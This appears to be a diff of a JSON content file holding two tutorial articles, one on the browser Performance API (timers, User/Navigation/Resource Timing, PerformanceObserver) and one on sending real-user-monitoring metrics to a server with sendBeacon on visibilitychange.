Then Spectre showed that a high-resolution timer is an attack instrument: cache hits and misses differ by nanoseconds, so a precise enough clock lets a page read memory it was never given. Browsers responded by **rounding** the value — to roughly 100µs by default, tightening to about 5µs when the page is [cross-origin isolated](/browser/156) (`COOP` + `COEP`), and by adding jitter. `SharedArrayBuffer`, which could be used to build a homemade clock out of a counter in a worker, was gated behind the same isolation.\n\nSo the sub-millisecond precision is real but capped, and it is capped by a security decision rather than a hardware limit.\n\n## The rest of the API\n\n`performance.now()` is one entry point into a much larger surface. Everything below lands on the *same* monotonic timeline, which is the point — a mark you set in your own code is directly comparable with TTFB or LCP without any conversion.\n\n| Sub-API | Entry type | Answers |\n| --- | --- | --- |\n| High Resolution Time | — | \"how long did this take?\" |\n| Navigation Timing | `navigation` | \"where did the page load time go?\" |\n| Resource Timing | `resource` | \"how long did each asset take, and was it cached?\" |\n| User Timing | `mark`, `measure` | \"how long did *my* code take?\" |\n| Paint / LCP / Layout Shift | `paint`, `largest-contentful-paint`, `layout-shift` | \"what did the user actually see, and when?\" |\n| Long Tasks / Event Timing | `longtask`, `event` | \"what blocked the main thread?\" — see [runtime performance](/system-design/401) |\n\n### User Timing — naming your own spans\n\n`mark()` records a timestamp; `measure()` records the interval between two of them and files it as a `PerformanceMeasure` entry alongside the browser's own.\n\n```javascript\nperformance.mark(\"data-fetch-start\");\nawait fetchUserData();\nperformance.mark(\"data-fetch-end\");\n\nperformance.measure(\"UserDataFetch\", \"data-fetch-start\", \"data-fetch-end\");\n\nconst [m] = performance.getEntriesByName(\"UserDataFetch\");\nconsole.log(`fetch took ${m.duration.toFixed(2)} ms`);\n```\n\nTwo reasons to prefer this over a bare `performance.now()` subtraction: the marks show up as labelled spans in the DevTools performance timeline, so a profile is readable without cross-referencing your logs; and the entries are collectable by the same observer that collects everything else, so one reporting path covers both.\n\n### Navigation Timing — where the page load went\n\nOne entry, describing the document itself, with a timestamp for every stage of [the request](/browser/160):\n\n```javascript\nconst [nav] = performance.getEntriesByType(\"navigation\");\n\nconst dns = nav.domainLookupEnd - nav.domainLookupStart;\nconst tcp = nav.connectEnd - nav.connectStart;\nconst tls = nav.secureConnectionStart\n  ? nav.connectEnd - nav.secureConnectionStart\n  : 0;\nconst ttfb = nav.responseStart - nav.requestStart;\n```\n\nThis is how you tell a slow *server* from a slow *network* from a slow *page*: a large `ttfb` with small `dns`/`tcp` is the backend; large `dns`/`tcp`/`tls` is the connection setup, which is an argument for a [CDN](/system-design/115); small everything but a late `domContentLoadedEventEnd` is your own JavaScript.\n\n### Resource Timing — per-asset, with one very useful field\n\n```javascript\nconst slow = performance\n  .getEntriesByType(\"resource\")\n  .filter((r) => r.duration > 500)\n  .map((r) => ({\n    url: r.name,\n    ms: Math.round(r.duration),\n    size: r.transferSize,\n  }));\n```\n\n`transferSize === 0` on a non-zero-size resource means **it came from cache** — the cheapest cache-hit-rate telemetry you will ever add. Two caveats: cross-origin resources return zeroed timings unless the server sends `Timing-Allow-Origin`, and the entry buffer is capped (~250 entries) and silently drops the rest, so call `performance.setResourceTimingBufferSize()` or clear it as you drain.\n\n### PerformanceObserver — the only correct way to collect\n\n`getEntries()` is a poll, and a poll races: FCP and LCP fire before your analytics bundle has parsed, so by the time you ask, you either missed them or you are asking repeatedly and burning main thread to do it.\n\n```javascript\nconst observer = new PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    report(entry.name, entry.startTime, entry.duration);\n  }\n});\n\n// buffered: true replays entries that fired before this observer existed.\nobserver.observe({ type: \"largest-contentful-paint\", buffered: true });\n```\n\n`buffered: true` is the whole trick — it hands you the entries the browser recorded before your code ran. Without it, late-loading analytics silently reports nothing for the paint metrics and everyone concludes the page has no LCP.\n\nNote that LCP fires **repeatedly** as larger elements paint; the real LCP is the last one before the first user interaction. Don't report the first one you see.\n\nTwo rules about the callback itself. It runs **on the main thread you are measuring**, so it buffers and returns — serialising and posting an entry from inside it is the jank you are trying to detect. And when you stop observing, drain first:\n\n```javascript\n// takeRecords() returns entries the browser recorded but has not yet handed\n// to the callback; disconnect() alone throws them away.\nfor (const entry of observer.takeRecords()) report(entry);\nobserver.disconnect();\n```\n\nGetting the buffer to a server is its own problem, with its own way of losing data — see [shipping performance data](/browser/164).\n\n## Common mistakes\n\n- **`Date.now()` for durations.** Correct almost always, wrong in a way you cannot reproduce.\n- **`performance.now()` for a timestamp you persist.** It is meaningless outside this document; if you need an absolute time, use `performance.timeOrigin + performance.now()`.\n- **Polling `getEntries()` instead of observing.** You race the entries that fired before your bundle loaded.\n- **Forgetting `buffered: true`.** The same race, quieter — you just get no paint metrics at all.\n- **Reading cross-origin resource timings without `Timing-Allow-Origin`.** Every field comes back `0` and looks like a fast asset.\n- **Reporting the first LCP entry.** LCP is emitted more than once; only the last one counts.\n- **Doing real work in the observer callback.** It runs on the main thread you are measuring; push to an array and leave.\n- **`disconnect()` without `takeRecords()`.** Whatever the browser had queued for the callback is dropped.\n- **Assuming microsecond precision.** It is rounded for Spectre mitigation, and more so without cross-origin isolation.\n\n## Key takeaways\n\n- Two clocks: wall clock for *when*, monotonic clock for *how long*. Never subtract wall-clock readings.\n- `performance.now()` is fractional milliseconds since `timeOrigin`, monotonic, and deliberately rounded for security.\n- Everything the API produces — navigation, resource, paint, your own marks — sits on that one timeline, so the numbers are directly comparable.\n- `mark`/`measure` put your spans in the DevTools timeline and in the same collection path as the browser's own metrics.\n- Collect with `PerformanceObserver` and `buffered: true`; `getEntries()` polling loses the early entries.\n- `transferSize === 0` is a free cache-hit signal; cross-origin entries need `Timing-Allow-Origin` to be non-zero.\n\n## Interview follow-ups\n\n- **\"Why not `Date.now()`?\"** — It is not monotonic. An NTP correction mid-measurement produces a wrong, possibly negative, duration.\n- **\"How would you measure how long a React render took?\"** — `performance.mark()` either side, `measure()` between; it lands in the profiler flame chart as a named span, not just in a log.\n- **\"Why is `performance.now()` rounded?\"** — Spectre. A high-resolution timer distinguishes a cache hit from a miss, which is enough to read memory across origins.\n- **\"How do you get LCP into your analytics?\"** — `PerformanceObserver` with `buffered: true`, keep the latest entry, and report on the first interaction or on `visibilitychange` — see [shipping performance data](/browser/164) for why that last event and not `unload`."
     },
     {
@@ -236,6 +768,36 @@
         "network"
       ],
       "source": "user paste: PerformanceObserver + Beacon API",
+      "summary": {
+        "definition": "Getting performance numbers off the user's device is a separate problem from measuring them. The moment you most want to report — the user leaving the page — is the moment the browser is least willing to run your code or wait for a request.",
+        "api": [
+          {
+            "signature": "navigator.sendBeacon(url, data)",
+            "note": "queues a small POST the browser will send even as the page goes away; fire-and-forget"
+          },
+          {
+            "signature": "document.addEventListener('visibilitychange', …)",
+            "note": "flush when `visibilityState` is `'hidden'` — the last event you can rely on, especially on mobile"
+          },
+          {
+            "signature": "'unload' / 'beforeunload'",
+            "note": "the trap: these never fire on mobile when the app is swiped away, so data written here is lost"
+          },
+          {
+            "signature": "observer.takeRecords()",
+            "note": "drain what the observer has buffered but not yet handed you, before you disconnect"
+          },
+          {
+            "signature": "fetch(url, { keepalive: true })",
+            "note": "when you need headers or a bigger body than a beacon allows"
+          },
+          {
+            "signature": "sendBeacon body type",
+            "note": "sent as `text/plain` unless you wrap it in a `Blob` — which can trip a server expecting JSON"
+          }
+        ],
+        "useCase": "Collecting Core Web Vitals and losing half of them, because the code reported on `unload` and most mobile users never trigger it."
+      },
       "answer": "A `PerformanceObserver` gives you the numbers. Getting them to your server is a separate problem, and it is the half that quietly loses data — because the moment you most want to report is the moment the browser is least willing to run your code.\n\n![Shipping RUM data](/diagrams/browser/beacon-flush.svg)\n\n## Don't report from inside the callback\n\nThe observer callback runs on the main thread — the same thread whose responsiveness you are measuring. A `fetch()` per entry means a request per metric, a JSON serialisation per metric, and a connection contending with the page's real work.\n\nBuffer instead. Push and return; that is the whole callback.\n\n```javascript\nlet metrics = [];\n\nconst observer = new PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    metrics.push({\n      type: entry.entryType,\n      name: entry.name,\n      value: entry.startTime || entry.duration,\n    });\n  }\n});\n\nfor (const type of [\"largest-contentful-paint\", \"layout-shift\", \"longtask\"]) {\n  try {\n    observer.observe({ type, buffered: true });\n  } catch {\n    // Safari has historically not supported every type; an unsupported type\n    // throws, and one throw must not cost you the types that do work.\n  }\n}\n```\n\nOne `observe()` call per type, each in its own `try`, because an unknown `type` throws rather than being ignored — and a single `try` around all three loses the two that were fine.\n\n## Flush when the page is hidden, not when it unloads\n\n`unload` and `beforeunload` are the intuitive choice and the wrong one. On mobile they frequently never fire: a user swipes the app away, the OS reclaims it, and the page is gone without a single teardown event. Worse, merely *registering* either handler makes the page ineligible for the back/forward cache in Chrome and Firefox, so you pay a real navigation cost for a handler that does not reliably run.\n\n`visibilitychange` to `hidden` is the reliable one. It fires on every tab switch, every app switch, and every path to termination.\n\n```javascript\ndocument.addEventListener(\"visibilitychange\", () => {\n  if (document.visibilityState !== \"hidden\" || metrics.length === 0) return;\n\n  // sendBeacon sends text/plain by default; a Blob is how you set the type.\n  const payload = new Blob([JSON.stringify(metrics)], {\n    type: \"application/json\",\n  });\n\n  if (navigator.sendBeacon(\"/api/rum\", payload)) {\n    metrics = []; // queued — don't re-send these if the user comes back\n  }\n});\n```\n\nClearing on success matters: a hidden page is often un-hidden a minute later, and without the reset the next flush re-sends everything you already reported. Clearing on *failure* would be the opposite bug — a `false` return means nothing was queued, so those entries should survive for the next attempt.\n\nAdd `pagehide` as a belt-and-braces second listener if you want; it fires on the paths `visibilitychange` covers plus a few navigations, and the idempotence you already have (an empty `metrics` array) makes the duplicate listener harmless.\n\n```trace\n{\n  \"input\": \"an LCP entry, a layout shift, then the user switches tabs\",\n  \"lanes\": [\n    { \"id\": \"buf\", \"label\": \"metrics[]\", \"kind\": \"slots\", \"slots\": [\"0\", \"1\"] },\n    { \"id\": \"life\", \"label\": \"page lifecycle\", \"kind\": \"phases\", \"of\": [\"visible\", \"hidden\", \"visible again\"] }\n  ],\n  \"vars\": [\"transport\", \"sent\"],\n  \"steps\": [\n    {\n      \"note\": \"LCP fires. The callback pushes and returns — no network, no serialisation.\",\n      \"cursors\": { \"life\": { \"at\": \"visible\" } },\n      \"marks\": { \"buf\": { \"0\": \"active\" } },\n      \"cells\": { \"buf\": [\"lcp 2140ms\", \"—\"] },\n      \"vars\": { \"transport\": \"idle\", \"sent\": \"nothing yet\" }\n    },\n    {\n      \"note\": \"A layout shift lands. Still just an array push.\",\n      \"cursors\": { \"life\": { \"at\": \"visible\" } },\n      \"marks\": { \"buf\": { \"1\": \"active\" } },\n      \"cells\": { \"buf\": [\"lcp 2140ms\", \"cls 0.03\"] },\n      \"vars\": { \"transport\": \"idle\", \"sent\": \"nothing yet\" }\n    },\n    {\n      \"note\": \"The user switches tabs. `visibilityState` is now `hidden` — the document may never run code again.\",\n      \"cursors\": { \"life\": { \"at\": \"hidden\" } },\n      \"cells\": { \"buf\": [\"lcp 2140ms\", \"cls 0.03\"] },\n      \"vars\": { \"transport\": \"flushing\", \"sent\": \"nothing yet\" }\n    },\n    {\n      \"note\": \"A `fetch()` here would be **cancelled** with the document — the request dies before it leaves.\",\n      \"cursors\": { \"life\": { \"at\": \"hidden\" } },\n      \"marks\": { \"buf\": { \"0\": \"bad\", \"1\": \"bad\" } },\n      \"cells\": { \"buf\": [\"lcp 2140ms\", \"cls 0.03\"] },\n      \"vars\": { \"transport\": \"fetch() — cancelled\", \"sent\": \"nothing\" }\n    },\n    {\n      \"note\": \"`sendBeacon` instead: the browser takes the payload and returns `true`. It will send it whether or not this page survives.\",\n      \"cursors\": { \"life\": { \"at\": \"hidden\" } },\n      \"marks\": { \"buf\": { \"0\": \"done\", \"1\": \"done\" } },\n      \"cells\": { \"buf\": [\"lcp 2140ms\", \"cls 0.03\"] },\n      \"vars\": { \"transport\": \"sendBeacon — queued\", \"sent\": \"2 entries\" }\n    },\n    {\n      \"note\": \"Queued means handed off, so the buffer is cleared. The user comes back and the next flush does not re-report the same two.\",\n      \"cursors\": { \"life\": { \"at\": \"visible again\" } },\n      \"cells\": { \"buf\": [\"—\", \"—\"] },\n      \"vars\": { \"transport\": \"idle\", \"sent\": \"2 entries, once\" }\n    }\n  ],\n  \"result\": \"the metrics survive a page the browser was free to kill\"\n}\n```\n\n## What `sendBeacon` gives up\n\nIt is a deliberately small API, and the constraints are the price of the guarantee.\n\n| Constraint | What it means in practice |\n| --- | --- |\n| Returns `true`/`false` | `true` is **queued**, not delivered. There is no delivery receipt, ever. |\n| No response | Fire and forget — you cannot read a body, a status, or an error. |\n| ~64KB per origin | Over the cap it returns `false` and sends **nothing**. Cap your buffer or chunk it. |\n| POST only | No method choice, no custom headers — so no `Authorization` header; identify by cookie or a body field. |\n| `text/plain` by default | A `Blob` with an explicit `type` is the only way to send `application/json`. |\n| [CORS](/browser/156) applies | Cross-origin still needs the server to allow the origin — and a non-simple content type triggers a preflight the beacon cannot wait for. |\n\nThat last row has a practical consequence: `application/json` is not a CORS-simple content type, so a cross-origin beacon with a JSON `Blob` needs a preflight. Same-origin (a `/api/rum` on your own domain) avoids the question entirely, which is the usual reason RUM endpoints are proxied through the app's own origin.\n\n## When you need more than a beacon\n\n`fetch()` with `keepalive: true` is the bigger sibling: same survive-the-unload behaviour, but you get a real `Response`, headers, and a method. It shares the same ~64KB budget across all in-flight keepalive requests, so it does not buy you a larger payload — only control.\n\n```javascript\nfetch(\"/api/rum\", {\n  method: \"POST\",\n  body: JSON.stringify(metrics),\n  headers: { \"Content-Type\": \"application/json\" },\n  keepalive: true,\n});\n```\n\nUse it when you need a header the beacon cannot set. Use `sendBeacon` otherwise; it is the one with the broadest support and the fewest ways to get wrong.\n\n## Tidying the observer up\n\nIf you only care about the initial load, stop observing once you have what you need — an observer left running keeps invoking your callback for the life of the page.\n\n```javascript\n// takeRecords() drains entries the browser recorded but has not yet\n// delivered to the callback. Without it, disconnect() throws them away.\nmetrics.push(...observer.takeRecords().map(toMetric));\nobserver.disconnect();\n```\n\n`takeRecords()` before `disconnect()`, always — the callback is invoked asynchronously, so there is nearly always something queued that the callback has not seen.\n\n## Common mistakes\n\n- **Sending one request per entry.** Battery, contention, and main-thread work inside the measurement itself.\n- **Flushing on `unload`/`beforeunload`.** Often does not fire on mobile, and registering it disables the bfcache.\n- **`fetch()` without `keepalive` on the way out.** The request is cancelled with the document.\n- **Passing a bare string to `sendBeacon`.** It arrives as `text/plain`; wrap it in a `Blob` to set the content type.\n- **Not clearing the buffer after a successful queue.** The metrics are re-sent every time the user hides and returns.\n- **Clearing it after a *failed* queue.** `false` means nothing was sent — those entries should live to try again.\n- **Ignoring the 64KB cap.** An over-large payload returns `false` and vanishes silently.\n- **`disconnect()` without `takeRecords()`.** Drops whatever the browser had queued but not yet delivered.\n\n## Key takeaways\n\n- The observer callback buffers; the network happens once, later.\n- Flush on `visibilitychange === \"hidden\"`, never on `unload` — it fires more reliably and keeps the bfcache.\n- `sendBeacon` hands the request to the browser, which sends it after the page is gone.\n- A `Blob` is how you get anything other than `text/plain`.\n- `true` means queued. There is no confirmation of delivery, and no response to read.\n- Clear the buffer on success only; `false` means resend later.\n- `fetch(..., { keepalive: true })` when you need headers or a response — same 64KB budget.\n\n## Interview follow-ups\n\n- **\"Why not `unload`?\"** — It is unreliable on mobile and registering a handler disqualifies the page from the back/forward cache. `visibilitychange` fires on every hide.\n- **\"What does the return value of `sendBeacon` tell you?\"** — Only that the browser accepted the payload into its queue. Delivery is unobservable from the page.\n- **\"How do you send JSON?\"** — A `Blob` with `type: \"application/json\"`; the default is `text/plain`.\n- **\"The user hides and un-hides the tab five times — how many reports?\"** — One, if you clear the buffer on a successful queue. Five copies of everything if you don't.\n- **\"Your payload is 200KB. What happens?\"** — `sendBeacon` returns `false` and sends nothing. Chunk it, sample it, or aggregate client-side before flushing."
     }
   ]
